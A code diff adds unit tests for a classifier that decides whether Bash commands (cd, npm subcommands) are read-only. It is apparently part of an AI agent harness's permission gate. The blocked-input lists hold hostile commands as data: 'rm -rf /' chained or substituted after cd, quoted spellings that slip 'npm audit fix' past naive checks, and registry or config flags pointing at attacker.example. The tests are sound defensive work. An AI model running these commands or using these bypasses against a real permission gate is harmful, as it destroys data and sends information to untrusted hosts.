@@ -103,6 +103,129 @@ describe("read-only Bash classifier", () => {
     });
   });
 
+  describe("cd (pure navigation form)", () => {
+    it.each([
+      "cd",
+      "cd -",
+      "cd ..",
+      "cd /tmp",
+      "cd /Users/lan/git/pandora/harness",
+      "cd ~",
+      "cd ../other-repo",
+      "cd -P /tmp",
+      "cd -L .",
+    ])("allows %s", (cmd) => {
+      expect(isReadOnlyBashCommand(cmd)).toBe(true);
+    });
+
+    it.each([
+      // Chained or redirected `cd` forms mutate more than shell state (or
+      // hide a write behind the navigation prefix) and must not be
+      // floored: the metachar guard in `isReadOnlyBashCommand` rejects
+      // the whole string before `cd` is ever inspected.
+      "cd /tmp && rm -rf /",
+      "cd /tmp; rm -rf /",
+      "cd /tmp || rm -rf /",
+      "cd /tmp | rm -rf /",
+      "cd $(rm -rf /)",
+      "cd `rm -rf /`",
+      "cd /tmp > out.txt",
+      "cd /tmp < input",
+    ])("blocks %s (chained/redirected cd is not read-only)", (cmd) => {
+      expect(isReadOnlyBashCommand(cmd)).toBe(false);
+    });
+  });
+
+  describe("npm read-only subcommands (curated allowlist)", () => {
+    it.each([
+      "npm audit",
+      "npm audit --json",
+      "npm audit signatures",
+      "npm audit --json signatures",
+      "npm ls",
+      "npm ls --depth=0",
+      "npm list",
+      "npm view lodash",
+      "npm view lodash version",
+      "npm info lodash", // alias for view
+      "npm show lodash", // alias for view
+      "npm outdated",
+      "npm why lodash",
+      "npm explain lodash", // formal name for why
+      "npm ping",
+    ])("allows %s", (cmd) => {
+      expect(isReadOnlyBashCommand(cmd)).toBe(true);
+    });
+
+    it.each([
+      // Mutating subcommands must stay unclassified (gated), not floored.
+      "npm install",
+      "npm i lodash",
+      "npm ci",
+      "npm publish",
+      "npm update",
+      "npm version patch",
+      "npm run build",
+      "npm audit fix",
+      "npm audit fix --force",
+      "npm audit --audit-level high", // separated flag value fails closed
+      "npm audit --omit dev", // separated flag value fails closed (any value-taking flag, not just --audit-level)
+      // Unknown/future npm subcommand: the allowlist is positive, so an
+      // unenumerated verb stays unclassified rather than assumed safe.
+      "npm some-future-verb",
+      // Aliases are deliberately NOT floored, only canonical spellings.
+      "npm la",
+      "npm ll",
+      "npm v lodash",
+    ])("blocks %s (positive allowlist, not a denylist)", (cmd) => {
+      expect(isReadOnlyBashCommand(cmd)).toBe(false);
+    });
+
+    it.each([
+      // Shell-quoting spellings of `fix` that a token-equality denylist
+      // would miss because none of the RAW tokens equals the string "fix"
+      // (npm's own argv parsing strips the quoting before npm ever sees
+      // it). The positive-shape check (only `-flags` or literal
+      // `signatures` after `audit`) fails closed on all of them.
+      "npm audit \"fix\"",
+      "npm audit 'fix'",
+      "npm audit f''ix",
+      "npm audit fi\"x\"",
+      "npm audit $'fix'",
+    ])("blocks %s (quoted/glued spellings of the mutating audit-fix arm)", (cmd) => {
+      expect(isReadOnlyBashCommand(cmd)).toBe(false);
+    });
+
+    it.each([
+      // --registry / --userconfig / --globalconfig redirect npm's network
+      // or config lookups to an operator-unverified location; forfeit the
+      // floor for ANY otherwise-read-only npm subcommand.
+      "npm audit --registry=http://attacker.example",
+      "npm audit --registry http://attacker.example",
+      "npm ls --registry=http://attacker.example",
+      "npm view lodash --userconfig=/tmp/evil.npmrc",
+      "npm outdated --globalconfig=/tmp/evil.npmrc",
+      // Per-scope registry override: npm resolves a scoped package's
+      // registry from `@scope:registry` before the plain `registry` config,
+      // so this is an equally live exfiltration vector, not merely a
+      // naming variant of the bare --registry flag above.
+      "npm view lodash --@scope:registry=http://e.x",
+      "npm audit --@myorg:registry=http://e.x",
+      "npm audit --@myorg:registry http://e.x",
+    ])("blocks %s (untrusted registry/config source flag)", (cmd) => {
+      expect(isReadOnlyBashCommand(cmd)).toBe(false);
+    });
+
+    it("floors `npm audit -fix` deliberately: verified npm behavior is a parse error, not the mutating fix arm", () => {
+      // Single dash, not the `fix` subcommand or a recognized flag cluster.
+      // Verified npm 11.17.0 behavior: `Unknown cli config "--fix"`, and npm
+      // falls back to the plain read-only report — it does NOT run
+      // `npm audit fix`. `startsWith("-")` correctly floors this; do not
+      // "fix" it into a block without re-verifying npm's parser first.
+      expect(isReadOnlyBashCommand("npm audit -fix")).toBe(true);
+    });
+  });
+
   describe("harness read-only subcommands", () => {
     it.each([
       "harness doctor",
